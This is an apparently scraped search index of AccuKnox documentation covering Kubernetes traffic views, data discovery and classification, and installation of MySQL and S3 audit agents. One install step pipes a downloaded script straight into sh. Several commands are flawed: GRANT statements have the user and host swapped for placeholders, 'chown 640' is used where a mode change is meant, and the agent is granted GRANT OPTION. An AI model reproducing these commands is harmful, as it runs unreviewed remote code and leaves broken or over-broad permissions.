zone/region in which your cluster (control plane and nodes) are located.</p> <p>Alerts: Number of alerts for the specific node.</p>"},{"location":"cluster_manager/k8s-cluster-management/#view-network-trafficgraph-view","title":"View network traffic/Graph view","text":"<p>Network traffic view will give additional flow information between the pods. This network traffic is grouped by namespaces. This view will give much visibility to your workloads.</p> <p></p> <p>Allowed traffic is indicated by the green lines and Restricted traffic is indicated by the red lines.</p> <p>When you right-click on a pod, you can see pod-related details on the right of the screen, and similarly, when you right-click on the flow line you are able to see a connection summary between two pods.</p> <p>You can also add policies to the connection from the connection summary window.</p> <p>There is an option to see the entire network traffic across your cluster.</p> <p><code>Cluster List view</code> -&gt; <code>click Number of pods</code> -&gt; <code>View Network Traffic</code></p> <p>This will give you network traffic for your entire cluster.</p> <p>Analyzing the flow information of your cluster, you can take decisions on how to secure your workloads at run-time.</p>"},{"location":"data-protection/overview/","title":"Overview","text":""},{"location":"data-protection/overview/#enterprise-data-challenges","title":"Enterprise Data Challenges","text":"<p>With the adoption of the cloud (private and public) enterprise data is being spread out into multiple places and stored in multiple technologies. As a result, enterprises are quickly being inundated with uncertainties of who has access to what data. To compound the matters, the aggressive postures taken by regulatory bodies such as GDPR, CCPA, HIPAA, HITRUST etc. are making it impossible to be certain about the access compliance of the data. </p> <p>The below diagram shows different dimensions of complexity aspects of enterprise data.</p> <p></p> <p>GIven the complexity of data explosion, enterprises are unable to answer some fundamental questions related to their data and its security. </p> <ul> <li>I do not know an exhaustive list of all the ways my data is stored.</li> <li>I do not know which user, which process, which application has access to what data. </li> <li>I do not have a way to apply the same access restrictions to the same data no matter which environment it is at any point in time.</li> <li>I do not know which data is sensitive and which data is not sensitive. (sensitive data would be more than CC or SSN, even name, email are considered PII)</li> <li>I do not know all the places where data exists for a specific user, transaction or object. </li> <li>While the access to the data from the application layer is protected, it is unclear about the access from system level, non-application centric data (backup, data warehouse, ML data etc.) </li> </ul>"},{"location":"data-protection/overview/#how-it-works","title":"How it works?","text":"<p>Discovery - In this part of the product, given a data source location (AWS, Azure, GCP, Network File System, Box, DropBox) or a Kubernates cluster,  the system will identify all the data sources available - regardless of \u201cHow it is stored\u201d (RDBMS, File, non-RDBMS etc.) </p> <p>Classification and Labelling Label - In this part of the product, for all the discovered data, the system will try to identify the sensitive data. The system will also label the data based on different sensitivity aspects of the data under different labels. A user will be allowed to confirm, override or delete the labels. </p> <p>Audit and Enforcement: In this part of the product, the system will monitor the access to the discovered and labeled data sources, and report/alert any exception to the policy specified for the data. In cases where technically possible, the system will prevent the access to the data in question. In addition to the functional aspect of the product, the system will have administrative capabilities to - </p> <p>Collect the access to the data source location and establish the connection. </p> <p>Create policies that specify which data labels are allowed access to by which identities</p> <p>Reporting to view and set up alerting mechanisms for policy exceptions</p>"},{"location":"data-protection/types-of-solutions/","title":"Types of solutions","text":""},{"location":"data-protection/types-of-solutions/#the-types-of-data-solutions-that-accuknox-provides-includes","title":"The types of data solutions that Accuknox provides includes","text":""},{"location":"data-protection/types-of-solutions/#data-provenance-for-s3-in-container-mounted-environments","title":"Data Provenance for S3 in Container mounted environments","text":"<p>This allows us to track and taint sensitive data in containerized environemnts as it flows through the network.</p> <p>The data provenance system is able to answer questions like: </p> <ul> <li>Which process [e.g., app] was used to create this data object [e.g., file]?</li> <li>When the process ran what were the other data object it wrote?</li> <li>What data objects did the process read?</li> <li>Could any data have flowed from this data object to that data object?</li> <li>What is the sensitivity of a given data flow or connection between processes?</li> </ul>"},{"location":"data-protection/types-of-solutions/#data-protection-and-sensitive-tracking-for-s3","title":"Data Protection and sensitive tracking for S3","text":"<p>A simpler version of the data protection and sensitive tracking for S3 enables us to track sensitive data and build audit logs at scale for S3 based sensitive data sources. </p> <p>This system is simply referred to as S3 Data Protection throughout Accuknox documentation.</p>"},{"location":"data-protection/types-of-solutions/#data-protection-and-governance-for-oltp-mysql-postgres","title":"Data Protection and Governance for OLTP - MySQL / Postgres","text":"<p>This is a unified visibility based system which provides policy as code for enabling audit policies against MySQL and Postgres databases in K8s and Virtual machine environments.</p>"},{"location":"data-protection/user-personas-use-cases/","title":"User personas use cases","text":""},{"location":"data-protection/user-personas-use-cases/#types-of-user-personas-and-use-cases-supported","title":"Types of user personas and use cases supported","text":"<p>User personas</p> <ul> <li>Application user - commonly accessing with an application, using a single and shared username and password.</li> <li>ML Researcher - Typically accessing data and copying it into a data lake or S3 for machine learning processing.</li> <li>Data Lake User - Other types of data lake users.</li> <li>Support Personal - Users who access data purely for customer support reasons.</li> </ul> <p></p> <p>Types of Use Cases addressed and available</p> <ul> <li> <p>Audit trail &amp; data governance \u2013 who accessed a given resource, and when. Provide compliance with known [ Available today ]</p> </li> <li> <p>Protection policies \u2013 policies that protect unauthorized access of data, or block access to specific sensitive classes of data [partial support - use with caution]</p> </li> <li>Differential privacy \u2013 limit access to specific \u000bfields of data., or selectively encrypt them [roadmap item] -Data access quota policies that restrict the number of times a particular dataset is accessed., or how many rows are accessed [roadmap Item]</li> </ul>"},{"location":"data-protection/data-agent/data-agent-installation/","title":"Data agent installation","text":""},{"location":"data-protection/data-agent/data-agent-installation/#accuknox-data-agent-db-configuration","title":"Accuknox Data Agent DB configuration","text":"<p>AccuKnox Data Agent can scan more than 1 Database at a time. </p> <p>The database to be scanned is configured through a file located at conf/agent-db-config.yaml The following is an example of a agent-db-config.yaml:</p> <p>apiVersion: v1 type: agent-db-config data:    workspace: 148   apiToken:    databases:     - version: V1       type: mysql       key: asdlkm2lk3n-q23-asd-12-3       host: localhost       port: 3306       user: ada_test_user       password: password     - version: V1       type: mysql       key: asdlkm2lk3n-q23-asd-12-3       host: localhost       port: 5432       user: test       password: test</p>"},{"location":"data-protection/data-agent/data-agent-installation/#installation","title":"Installation","text":"<p>Unzip AccuKnox Data Agent</p> <p>Edit the conf/agent-db-config.yaml</p> <p>Add the Workspace ID</p> <p>Add the apiToken</p> <p>The app.yaml and agent-db-config.yaml files must be present inside conf/ folder.</p> <p>Run AccuKnox Data Agent ./ada</p>"},{"location":"data-protection/data-agent/introduction/","title":"Introduction","text":""},{"location":"data-protection/data-agent/introduction/#accuknox-data-agent","title":"AccuKnox Data Agent","text":"<p>Accuknox Data Agent scans for the database, tables in the database and columns in those tables and exports them to AccuKnox SaaS for data classification and labelling.</p>"},{"location":"data-protection/data-agent/requirements/","title":"Requirements","text":""},{"location":"data-protection/data-agent/requirements/#what-is-accuknox-data-agent","title":"What is Accuknox Data Agent","text":"<p>Accuknox Data Agent scans for the database, tables in the databases, columns in those tables and exports them to AccuKnox SaaS for data classification and labelling.</p>"},{"location":"data-protection/data-agent/requirements/#hardware-requirements","title":"Hardware Requirements","text":"<ul> <li>RAM - 1 GB (Minumum)</li> <li>Storage 512 MB (Minimum)</li> </ul>"},{"location":"data-protection/data-agent/requirements/#system-requirements","title":"System Requirements","text":"<p>AccuKnox Data Agent runs on a Linux host and can be run on Linux based OSes such as Ubuntu 18.04+, Debian 8+, CentOS 7+, Fedora and RHEL.</p>"},{"location":"data-protection/data-agent/requirements/#software-requirements","title":"Software Requirements","text":"<p>In order to use Accuknox Data Agent, a working MySQL server 5.6+ that it can connect to is all that is required. </p>"},{"location":"data-protection/data-agent/requirements/#network-requirements","title":"Network Requirements","text":"<p>AccuKnox Data Agent requires port number 443 to be open for egress. This port will be used to communicate with the AccuKnox Control Plane.</p>"},{"location":"data-protection/data-agent/requirements/#permissions-required-by-accuknox-data-agent-on-mysql","title":"Permissions required by Accuknox Data Agent on MySQL.","text":"<p>AccuKnox Data Agent requires a MySQL user and password with read-only permission to the information_schema table.</p>"},{"location":"data-protection/data-agent/requirements/#mysql-56","title":"MySQL 5.6+","text":"<pre><code>CREATE USER 'ada_user'@'&lt;host&gt;' IDENTIFIED BY '&lt;password&gt;';\nGRANT SELECT ON information_schema.* TO '&lt;host&gt;'@'&lt;password&gt;';\nFLUSH PRIVILEGES;\n</code></pre>"},{"location":"data-protection/data-protection-saas/how-to-configure-datasource/","title":"How to Configure Datasource","text":""},{"location":"data-protection/data-protection-saas/how-to-configure-datasource/#step-1-onboard-a-database","title":"Step 1 : Onboard a Database","text":"<p>The user will be able to see the onboarded Datasource in the dashboard.</p>"},{"location":"data-protection/data-protection-saas/how-to-configure-datasource/#lets-configure-datasource","title":"Let's configure Datasource","text":"<p>Go to  Datasource in Data Protection Manager, click on Configure Datasource. </p> <p></p> <ol> <li> <p>Select the Source type Database. </p> </li> <li> <p>Select the Datasource domain where the data is hosted.</p> </li> <li> <p>Enter the Datasource name and Datasource description.</p> </li> <li> <p>Select the Datasource type Percona MySQL </p> </li> <li> <p>Select the Datasource version.</p> </li> <li> <p>Click on the Save and next button to install the AccuKnox data agent deployment.</p> </li> </ol> <p>Accuknox Data Agent Deployment</p> <ul> <li>To install the Accuknox Data Agent for MySQL, follow the steps in the installation Agents page.</li> </ul> <p></p> <ul> <li>There is workspace ID and and key which dynamically generated.</li> </ul> <p></p> <ul> <li>Click on the Next button to see the configured Datasource.</li> </ul> <p></p> <ul> <li> <p>It will automatically redirect to the Datasource Inventory where all the configured Datasource can be viewed.</p> </li> <li> <p>The Databases for a particular onboarded Datasource can be viewed when the user select a particular Datasource.</p> </li> <li> <p>The Accuknox data agent will scan the tables and columns in the given database which will map the sensitive classes and tags to their respective columns.</p> </li> </ul>"},{"location":"data-protection/data-protection-saas/how-to-manage-a-sensitive-class/","title":"How to manage a sensitive class","text":""},{"location":"data-protection/data-protection-saas/how-to-manage-a-sensitive-class/#how-to-create-a-class","title":"How to create a class","text":"<p>The class inventory, where users can create a list of sensitive classes for sensitive datasource</p> <ul> <li> <p>Click on the Sensitive Source Labels from the Data Protection.</p> </li> <li> <p>Select Class on the DSL Filter provided</p> </li> </ul> <p></p> <p>The present class inventory can be viewed, with class description , associated Tags</p> <p>Steps to create a sensitive class </p> <ol> <li> <p>Click on Create Label.</p> </li> <li> <p>Select Class from the dropdown.</p> </li> </ol> <p></p> <ol> <li> <p>Enter the Class Name (ex: Phone numbers, Credit cards, Email ID)</p> </li> <li> <p>Enter the Class description. </p> </li> <li> <p>Enter the Match Pattern, which is a regex pattern of a sensitive class, and here user can add multiple match patterns.</p> </li> <li> <p>Enter to exclude pattern. </p> </li> <li> <p>Add relevant tags to the class.</p> </li> <li> <p>Then click on create.</p> </li> </ol>"},{"location":"data-protection/data-protection-saas/how-to-manage-a-sensitive-class/#edit-a-sensitive-class","title":"Edit a sensitive class","text":"<ol> <li> <p>Click on the Sensitive Source Labels from Data Protection and come to class inventory by selecting class on DSL filter</p> </li> <li> <p>Select the class name which you want to edit, click on the edit button on extreme right</p> </li> <li> <p>Edit the class and match patterns.</p> </li> <li> <p>Click on the Save button.</p> </li> </ol>"},{"location":"data-protection/data-protection-saas/how-to-manage-a-sensitive-class/#delete-a-sensitive-class","title":"Delete a sensitive class","text":"<ol> <li> <p>Click on the class inventory from data protection.</p> </li> <li> <p>Select the class name which you want to delete, click on the delete button on extreme right</p> </li> <li> <p>Then open a Confirmation tab, click on the delete.</p> </li> </ol>"},{"location":"data-protection/data-protection-saas/how-to-manage-a-sensitive-tag/","title":"How to manage a sensitive tag","text":"<p>Create tags for datasource </p> <p>The Tag inventory, where users can create a list of sensitive tags for sensitive datasource</p> <p>Click on the Sensitive Source Labels from the Data Protection.</p> <p>Select Tag on the DSL Filter provided</p> <p></p> <ol> <li>Click the Create a Label and select the tag.</li> </ol> <p></p> <ol> <li> <p>Enter the Tag Name (ex: GDPR, HIPAA, SOX)</p> </li> <li> <p>Enter the Tag Description.</p> </li> <li> <p>Add relevant Sensitive Class.</p> </li> <li> <p>Click on Create button.</p> </li> </ol>"},{"location":"data-protection/data-protection-saas/how-to-manage-a-sensitive-tag/#edit-a-sensitive-tags","title":"Edit a Sensitive Tags","text":"<ol> <li> <p>Click on the tag inventory from the data protection.</p> </li> <li> <p>Click on the particular tag column which you want to edit, click on the edit button.</p> </li> <li> <p>Enter the new tag details and sensitive class, click on the Save button.</p> </li> </ol>"},{"location":"data-protection/data-protection-saas/how-to-manage-a-sensitive-tag/#delete-a-sensitive-tag","title":"Delete a Sensitive Tag","text":"<ol> <li> <p>Click on the tag inventory from the data protection.</p> </li> <li> <p>Click on the particular tag column which you want to delete, click on the delete button.</p> </li> </ol>"},{"location":"data-protection/data-protection-saas/how-to-manage-database-policy/","title":"How to manage Database policy","text":""},{"location":"data-protection/data-protection-saas/how-to-manage-database-policy/#how-to-create-a-database-policy","title":"How to create a database policy","text":"<ul> <li>After mapping, create a policy for the particular Database.</li> </ul> <ol> <li> <p>Enter the Policy name.</p> </li> <li> <p>Enter the policy Description.</p> </li> <li> <p>Click on the databases to see the tables and select the column which policy to apply.</p> </li> <li> <p>Select the actions, here we can select multiple actions.                </p> </li> <li> <p>After selecting the actions, click on the Save button.</p> </li> <li>By default, the policy, will be inactive mode, switch to active mode to apply policy on the datasource.</li> </ol> <p></p> <ul> <li>More policies can be added by coming on Database Policy under Data Protection Manager.</li> <li>To view, the database access logs, click on the view logs button, which will redirect to the log summary page.</li> </ul>"},{"location":"data-protection/data-protection-saas/how-to-manage-databases/","title":"How to manage Databases","text":"<p>After configuring the Datasource we can see the datasource in this inventory </p> <ol> <li>Click on the Datasource from data protection.</li> <li>Accuknox provides you with a dashboard where all data sources are configured.</li> </ol> <p></p> <ul> <li> <p>Information about Datasources like  Database Name, Data Domain, Data Type and Version.</p> </li> <li> <p>To add more Datasources, click on the Configure Datasource button on the right top corner.</p> </li> <li> <p>Click on the particular Datasource to view the Database associated with it.</p> </li> </ul> <p></p> <ul> <li>Click on the Database name to view the details of the Database, Tables in the database, view all Sensitive Classes and Tags associated.</li> </ul> <p></p> <ul> <li>Click on the Tables to view and edit the sensitive classes and tags associated with the particular column in the database.</li> </ul> <p></p> <ul> <li>Based on schema for the Database, a policy can be created from the given Database details by clicking on Create Policy button on top right corner of the screen.</li> </ul>"},{"location":"data-protection/data-protection-saas/how-to-manage-s3-buckets/","title":"How to Manage S3 Buckets","text":""},{"location":"data-protection/data-protection-saas/how-to-manage-s3-buckets/#to-view-s3-buckets-which-are-configured","title":"To view S3 buckets which are configured","text":"<ul> <li>Click on the S3 Inventory from Data protection</li> </ul> <ul> <li> <p>Here we can view the S3 buckets which are configured </p> </li> <li> <p>In this S3 inventory, the dashboard consists of S3 Bucket name and labels, Cluster, Number of Alerts.</p> </li> <li> <p>Click on the particular bucket to see the Labels and Sensitive Sources </p> </li> </ul> <p>If you want to configure a New Data Source, Click on the \"Configure Data Source\".</p>"},{"location":"data-protection/data-protection-saas/how-to-manage-s3-buckets/#how-to-configure-s3-buckets","title":"How to configure S3 Buckets?","text":"<ol> <li>Select the  Bucket Files in Source type.</li> </ol> <ol> <li>Click on Save and Next.</li> </ol> <ol> <li> <p>Follow the steps to install the Accuknox S3 Audit Reporter.</p> </li> <li> <p>Once the agent has been configured and is running, it'll start syncing the objects in the data bucket with the AccuKnox Platform.</p> </li> <li> <p>It will be redirected to sensitive source label page.</p> </li> </ol>"},{"location":"data-protection/data-protection-saas/how-to-manage-sensitive-source-labels/","title":"Sensitive Source Labels","text":""},{"location":"data-protection/data-protection-saas/how-to-manage-sensitive-source-labels/#what-are-the-sensitive-source-labels","title":"What are the Sensitive source labels?","text":"<p>Sensitivity labels allow users to classify documents as confidential or highly confidential labels which, once applied, determine what users can do with that file.</p> <p>A user can view the details of existing labels, clusters and owner.</p> <p></p>"},{"location":"data-protection/data-protection-saas/how-to-manage-sensitive-source-labels/#how-to-configure-label-and-source-type","title":"How to configure label and source type?","text":"<ol> <li> <p>Select and enter a unique label.</p> </li> <li> <p>Select the required S3 bucket, a user can select multiple buckets at once if needed.</p> </li> <li> <p>Select the required objects text file, then click on NEXT.</p> </li> </ol> <p></p> <ol> <li> <p>The user will be able to see a summary of S3 bucket objects within the S3 bucket added as sensitive   source(s).</p> </li> <li> <p>The user has to click on SAVE to implement.</p> </li> </ol> <p></p> <ol> <li> <p>After saving, the user will be redirected to Sensitive Source Labels screen.</p> </li> <li> <p>To see the audit logs for Bucket files, refer to the log summary page.</p> </li> </ol>"},{"location":"data-protection/data-protection-saas/overview/","title":"Overview","text":""},{"location":"data-protection/data-protection-saas/overview/#overview","title":"Overview","text":"<p>This section helps you navigate to the topics of Data Protection.  Data Protection for Databases and S3 bucket files</p> <ul> <li>Databases</li> <li>S3 Bucket files</li> </ul>"},{"location":"data-protection/mysql/components-for-installation/","title":"Components for installation","text":"<p>To install Accuknox's data protection for MySQL, you need to install the following two components.</p> <ul> <li> <p>AccuKnox Data Agent - Scans for databases, tables and columns  </p> </li> <li> <p>Audit Log Exporter - Exports access information to AccuKnox Control Plane</p> </li> </ul>"},{"location":"data-protection/mysql/introduction/","title":"Introduction","text":""},{"location":"data-protection/mysql/introduction/#accuknox-data-protection-for-mysql","title":"AccuKnox Data Protection for MySQL","text":"<p>Accuknox Data Security Product provides unprecedented \u201cunified\u201d visibility and policy based access control to MySQL data sources regardless of whether the data source is on-prem or private cloud or public cloud. </p>"},{"location":"data-protection/mysql/audit-log-exporter/installation/","title":"Installation","text":""},{"location":"data-protection/mysql/audit-log-exporter/installation/#audit-log-plugin-installation","title":"Audit Log Plugin Installation","text":""},{"location":"data-protection/mysql/audit-log-exporter/installation/#percona-mysql-server","title":"Percona MySQL Server","text":"<p>Percona MySQL Server already comes with the audit log plugin, but it is not enabled by default. To enable it, login to the MySQL instance and do the following: <pre><code>INSTALL PLUGIN audit_log SONAME 'audit_log.so';\n</code></pre></p>"},{"location":"data-protection/mysql/audit-log-exporter/installation/#mysql-community-edition","title":"MySQL Community Edition","text":"<p>MySQL Community Edition does not come with the audit log plugin by default. To download the audit log plugin, follow the below steps.</p> <p>Note: The Percona MySQL Server version in below steps should match your corresponding MySQL Server version to download the audit_log.so file.</p>"},{"location":"data-protection/mysql/audit-log-exporter/installation/#download","title":"Download","text":"<p>For MySQL 5.7+ <pre><code>wget https://www.percona.com/downloads/Percona-Server-5.7/LATEST/binary/tarball/Percona-Server-5.7.34-37-Linux.x86_64.glibc2.12.tar.gz\n</code></pre></p> <p>For MySQL 8.0+ <pre><code>wget https://www.percona.com/downloads/Percona-Server-8.0/LATEST/binary/tarball/Percona-Server-8.0.25-15-Linux.x86_64.glibc2.12.tar.gz\n</code></pre></p> <p>Extract the downloaded Percon Server <pre><code>tar xfz Percona-Server-&lt;version number&gt;-Linux.x86_64.glibc2.12.tar.gz\n</code></pre></p> <p>Navigate to <code>lib/mysql/plugin</code> folder <pre><code>cd Percona-Server-&lt;version number&gt;-Linux.x86_64.glibc2.12/lib/mysql/plugin\n</code></pre></p> <p>Find the plugin location of MYSQL community Edition <pre><code>show global variables like 'plugin%';\n</code></pre></p> <p>Copy audit_log.so plugin file to  <pre><code>cp audit_log.so &lt;MYSQL_PLUGIN_PATH&gt;\n</code></pre> <p>Login into your MySQL server <pre><code>mysql -u &lt;user_name&gt; -p &lt;password&gt;\n</code></pre></p> <p>Enable the audit log plugin <pre><code>INSTALL PLUGIN audit_log SONAME 'audit_log.so';\n</code></pre></p> <p>Verify installation <pre><code>show global variables like '%audit%';\n</code></pre></p> <p>By default, all the databases, user accounts present in the MySQL instance are audited.  To inculde/exclude specific databases, users to audit: <pre><code>SET GLOBAL audit_log_include_databases = 'userservice, ordersservice';\n\nSET GLOBAL audit_log_include_accounts = 'user1@localhost,root@localhost';\n</code></pre></p> <p>You can also audit the access of specific commands.  <pre><code>SET GLOBAL audit_log_include_commands= 'select,delete';\n</code></pre></p>"},{"location":"data-protection/mysql/audit-log-exporter/installation/#fluentd-installation","title":"Fluentd Installation","text":"<p>Install td-agent 4 <pre><code>#Ubuntu Focal\ncurl -L https://toolbelt.treasuredata.com/sh/install-ubuntu-focal-td-agent4.sh | sh\n</code></pre></p> <p>Launch Daemon <pre><code>sudo systemctl start td-agent.service\nsudo systemctl status td-agent.service\n</code></pre></p>"},{"location":"data-protection/mysql/audit-log-exporter/installation/#configuration","title":"Configuration","text":"<p>Fluentd's configuration file is present at <code>/etc/td-agent/td-agent.conf</code>.</p> <p>Edit it <pre><code>&lt;source&gt;\n    @type tail\n    tag mysql\n    path /var/log/mysql/audit.log*\n    pos_file /opt/td-agent/audit/fluentd/mysql/audit.log.pos\n    read_from_head true\n    follow_inodes true\n    &lt;parse&gt;\n        @type none\n    &lt;/parse&gt;\n&lt;/source&gt;\n&lt;filter mysql&gt;\n    @type record_transformer\n    &lt;record&gt;\n        wsid &lt;workspace_id&gt;\n        datasourcetype \"mysql\"\n        datadomainid &lt;datadomain_id&gt;\n        dbkey &lt;db_key&gt;\n    &lt;/record&gt;\n&lt;/filter&gt;\n&lt;match mysql&gt;\n  @type http\n  endpoint_url https://api-dev.accuknox.com/agent-data-collector/api/v1/collect-data/dp-mysql-audit-logs\n  http_method post\n  &lt;buffer&gt;\n     flush_mode interval\n     flush_interval 10s\n  &lt;/buffer&gt;\n&lt;/match&gt;\n</code></pre></p> <p>In the above code snippet, <code>/var/log/mysql/audit.log*</code> is the path where the MySQL audit log is being read from and then pushed to the http endpoint url. </p> <p>User <code>td-agent</code> requires <code>read</code> permission to read the logs at <code>/var/log/mysql/audit.log*</code>. Otherwise, <code>td-agent</code> throws log unreadable error.</p> <p>Add 'td-agent' user to the \u2018adm\u2019 group, as the audit log file\u2019s group name is 'adm': <pre><code>usermod -a -G adm td-agent\n</code></pre></p> <p>Check whether the 'adm' group been added to the 'td-agent' user, by running following command: <pre><code>id td-agent\n</code></pre></p> <p>Then, <pre><code>sudo chown 640 /var/log/mysql/audit.log\n</code></pre></p> <p>The pos files generated by fluentd will be stored at <code>/opt/td-agent/audit/fluentd</code>.  Make sure <code>td-agent</code> has permission:  <pre><code>sudo chown td-agent -R /opt/td-agent/audit/fluentd\n</code></pre></p> <p>To reflect the changes made in config file, we need to restart the td-agent service: <pre><code>sudo service td-agent restart\n</code></pre></p> <p>To check td-agent's logs <pre><code>sudo tail -f /var/log/td-agent/td-agent.log\n</code></pre></p>"},{"location":"data-protection/mysql/audit-log-exporter/introduction/","title":"Introduction","text":""},{"location":"data-protection/mysql/audit-log-exporter/introduction/#audit-log-exporter","title":"Audit Log Exporter","text":"<p>The Audit Log Exporter exports the audit information to the AccuKnox Control Plane. The Audit Log Exporter is made of open-source tools such as Percona's Audit Log plugin and Fluentd.</p>"},{"location":"data-protection/mysql/audit-log-exporter/introduction/#host-requirements","title":"Host Requirements","text":"<p>The Audit Log Exporter runs on the host where the MySQL Server is running on. Audit Log Exporter itself requires a minimum of 512 MB RAM and 512 MB disk space.</p>"},{"location":"data-protection/mysql/data-agent/installation/","title":"Installation","text":""},{"location":"data-protection/mysql/data-agent/installation/#accuknox-data-agent-db-configuration","title":"Accuknox Data Agent DB configuration","text":"<p>AccuKnox Data Agent can scan one or more database.</p> <p>The database to be scanned is configured through a file located at conf/agent-db-config.yaml The following is an example of a agent-db-config.yaml:</p> <pre><code>apiVersion: v1\ntype: agent-db-config\ndata: \n  workspace: 148\n  client-id: \n  client-secret: \n  databases:\n    - version: V1\n      type: mysql\n      key: asdlkm2lk3n-q23-asd-12-3\n      host: localhost\n      port: 3306\n      user: ada_test_user\n      password: password\n    - version: V1\n      type: mysql\n      key: asdlkm2lk3n-q23-asd-12-3\n      host: localhost\n      port: 5432\n      user: test\n      password: test\n</code></pre> <p>AccuKnox Data Agent requires a MySQL user account that can perform SELECT on information_schema.* and should be able to perform GRANT.</p> <p>Create a new MySQL user <pre><code>CREATE USER 'accuknox'@'localhost' IDENTIFIED BY 'password';\n</code></pre></p> <p>By default, the users created will have read only access to information_schema, so no additional privileges are needed on information_schema.</p> <pre><code>GRANT USAGE on *.* TO 'accuknox'@'localhost' WITH GRANT OPTION;\n</code></pre> <p>The GRANT OPTION allows AccuKnox Data Agent to allow/deny access to users.</p>"},{"location":"data-protection/mysql/data-agent/installation/#installation","title":"Installation","text":"<p>Unzip AccuKnox Data Agent</p> <p>Edit the conf/agent-db-config.yaml</p> <p>Add the Workspace ID</p> <p>Add the client-id and client-secret created for Keycloak for the accuknox-dp-agents client in accuknox realm</p> <p>In app.yaml, update the application.url.agent-login to the keycloak openid-connect URL. It should be something like <pre><code>https://&lt;keycloak-domain&gt;/auth/realms/&lt;realm&gt;/protocol/openid-connect/token\n</code></pre></p> <p>The app.yaml and agent-db-config.yaml files must be present inside conf/ folder.</p> <p>Run AccuKnox Data Agent <code>./ada &gt; /dev/null 2&gt;&amp;1 &amp;</code></p>"},{"location":"data-protection/mysql/data-agent/introduction/","title":"Introduction","text":""},{"location":"data-protection/mysql/data-agent/introduction/#accuknox-data-agent-for-mysql","title":"AccuKnox Data Agent for MySQL","text":"<p>Accuknox Data Agent scans for the database, tables in the database and columns in those tables and exports them to AccuKnox SaaS for data classification and labelling.</p>"},{"location":"data-protection/mysql/data-agent/introduction/#hardware-requirements","title":"Hardware Requirements","text":"<ul> <li>RAM - 1 GB (Minumum)</li> <li>Storage 512 MB (Minimum)</li> </ul>"},{"location":"data-protection/mysql/data-agent/introduction/#system-requirements","title":"System Requirements","text":"<p>AccuKnox Data Agent runs on a Linux host and can be run on Linux based OSes such as Ubuntu 18.04+, Debian 8+, CentOS 7+, Fedora and RHEL.</p>"},{"location":"data-protection/mysql/data-agent/introduction/#software-requirements","title":"Software Requirements","text":"<p>In order to use Accuknox Data Agent, a working MySQL server 5.6+ that it can connect to is all that is required. </p>"},{"location":"data-protection/mysql/data-agent/introduction/#network-requirements","title":"Network Requirements","text":"<p>AccuKnox Data Agent requires port number 443 to be open for egress. This port will be used to communicate with the AccuKnox Control Plane.</p>"},{"location":"data-protection/mysql/data-agent/introduction/#permissions-required-by-accuknox-data-agent-on-mysql","title":"Permissions required by Accuknox Data Agent on MySQL.","text":"<p>AccuKnox Data Agent requires a MySQL user and password with read-only permission to the information_schema table.</p>"},{"location":"data-protection/mysql/data-agent/introduction/#mysql-57","title":"MySQL 5.7+","text":"<pre><code>CREATE USER 'ada_user'@'&lt;host&gt;' IDENTIFIED BY '&lt;password&gt;';\nGRANT SELECT ON information_schema.* TO '&lt;host&gt;'@'&lt;password&gt;';\nFLUSH PRIVILEGES;\n</code></pre>"},{"location":"data-protection/s3/introduction/","title":"Introduction","text":""},{"location":"data-protection/s3/introduction/#accuknox-s3-access-audit","title":"AccuKnox S3 Access Audit","text":"<p>AccuKnox S3 Access Audit allows you to audit the access of the objects stored in an AWS S3 bucket. With AccuKnox S3 Access Audit, users can understand what operation was performed on S3 objects, the status of the operation, who performed the operation and when the operation was performed on an S3 object.</p>"},{"location":"data-protection/s3/requirements/","title":"Requirements","text":""},{"location":"data-protection/s3/requirements/#data-buckets","title":"Data Buckets","text":"<p>Data Buckets are the buckets where we store the actual data.  Create data buckets: https://docs.aws.amazon.com/AmazonS3/latest/userguide/create-bucket-overview.html</p>"},{"location":"data-protection/s3/requirements/#logs-buckets","title":"Logs Buckets","text":"<p>Logs buckets are where the S3 Access logs are written to by AWS S3 Server. Configure log buckets: https://docs.aws.amazon.com/AmazonS3/latest/userguide/enable-server-access-logging.html</p>"},{"location":"data-protection/s3/s3-audit-reporter-installation-guide/","title":"S3 audit reporter installation guide","text":"<p>The following article provides the pre-requisites and instructions to install AccuKnox S3 Audit Reporter agent to monitor access logs of S3 buckets and export relevent metrics to AccuKnox Control Plane.</p>"},{"location":"data-protection/s3/s3-audit-reporter-installation-guide/#requirements","title":"Requirements","text":"<p>The following software and network requirements must be met.</p>"},{"location":"data-protection/s3/s3-audit-reporter-installation-guide/#aws-s3-requirements","title":"AWS S3 Requirements","text":"<p>For any AWS S3 bucket that needs to be monitored, we need the following requirements to be met with:</p> <ol> <li> <p>Enable the AWS S3 Access Logs - https://docs.aws.amazon.com/AmazonS3/latest/userguide/enable-server-access-logging.html</p> </li> <li> <p>Create AWS user credentials(access key id and secret access key) for the Data Bucket - the bucket that contains the objects to be monitored. This user credentials must have permission to list the objects in the data bucket.</p> </li> <li> <p>Create AWS user credentials(access key id and secret access key) for the Logs Bucket - the bucket that contains the logs objects. This user credentials must have permissions to list the objects and retreive the objects present in the logs bucket.</p> </li> </ol>"},{"location":"data-protection/s3/s3-audit-reporter-installation-guide/#software-requirements","title":"Software Requirements","text":"<p>AccuKnox S3 Audit Reporter supports Linux and can be run on most major Linux based OSes such as Ubuntu 18.04+, Debian 8+, CentOS 7+.</p>"},{"location":"data-protection/s3/s3-audit-reporter-installation-guide/#network-requirements","title":"Network Requirements","text":"<p>AccuKnox S3 Audit Reporter requires port number 443 to be open for egress. This port will be used to fetch S3 Access Log data, Bucket data and to push metrics to AccuKnox Control Plane.</p>"},{"location":"data-protection/s3/s3-audit-reporter-installation-guide/#aws-s3-bucket-configuration","title":"AWS S3 Bucket configuration","text":"<p>AccuKnox S3 Audit Reporter can monitor more than 1 bucket at a time. </p> <p>The bucket to be monitored is configured through a file located at conf/buckets.yaml The following is an example of a buckets.yaml:</p> <pre><code>apiVersion: v1\ntype: S3AuditReporterBuckets\ndata:\n  workspace: 30921123\n  apiToken: as013n21m3nkjn2m1m97sd\n  buckets:\n    - dataBucketName: bucket-1\n      logsBucketName: bucket-1-logs\n      logPrefix: logs/\n      dataBucketAccessKeyId: AK.....\n      dataBucketSecretAccessKey: 99.....\n      logBucketAccessKeyId: AK...\n      logBucketSecretAccessKey: 99....\n      dataSourceProvider: AWS\n      bucketRegion: us-west-2\n    - dataBucketName: bucket-2\n      logsBucketName: bucket-2-logs\n      logPrefix:\n      dataBucketAccessKeyId: AK.....\n      dataBucketSecretAccessKey: 99.....\n      logBucketAccessKeyId: AK...\n      logBucketSecretAccessKey: 99....\n      dataSourceProvider: AWS\n      bucketRegion: us-west-2\n</code></pre>"},{"location":"data-protection/s3/s3-audit-reporter-installation-guide/#installation","title":"Installation","text":"<p>Unzip 